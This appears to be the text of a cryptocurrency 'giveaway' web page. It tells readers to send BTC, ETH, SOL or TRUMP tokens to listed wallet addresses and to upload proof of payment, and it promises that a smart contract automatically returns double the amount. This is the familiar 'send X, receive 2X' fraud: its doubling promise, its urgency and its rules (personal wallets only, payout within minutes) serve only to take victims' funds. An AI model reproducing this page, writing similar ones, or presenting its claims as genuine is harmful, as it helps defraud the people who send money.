How to Participate

Follow these simple steps to join the biggest crypto giveaway

01

Choose Your Crypto

Select which cryptocurrency you want to participate with: BTC, ETH, SOL, or TRUMP tokens. Each has different minimum and maximum limits.

BTC: 0.1 - 20 BTC
ETH: 1 - 500 ETH
SOL: 10 - 10,000 SOL
TRUMP: 1,000 - 1,000,000 TRUMP
02

Send to Address

Copy the official wallet address for your chosen cryptocurrency and send your contribution from your personal wallet.

BTC: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
ETH: 0x5336ff633160a71570e6084f14110412765cF66F
SOL: oSv1p7gEiKkGVg6AEqZ291bx9kuNEiwxRxZfgMVHabs
03

Wait for Confirmation

The blockchain confirms your transaction automatically. This usually takes 5-10 minutes depending on network congestion.

Transaction broadcasted to network
Pending confirmations (1/6 blocks)
Transaction confirmed on-chain
04

Receive 2x Back

Once confirmed, the smart contract automatically sends double your contribution back to your wallet address.

You send: 0.5 BTC You receive: 1.0 BTC
You send: 10 SOL You receive: 20 SOL

Important Rules

Personal Wallet Only

Do not send from exchange wallets (Binance, Coinbase, etc.). Use a personal wallet like MetaMask, Phantom, or Trust Wallet.

One Entry Per Wallet

Each wallet address can only participate once. Duplicate entries will be rejected.

Payment Proof Required

After sending, you must upload a screenshot of your transaction for verification.

Payout Timeline

Once verified, you will receive 2x your amount within 5-10 minutes.
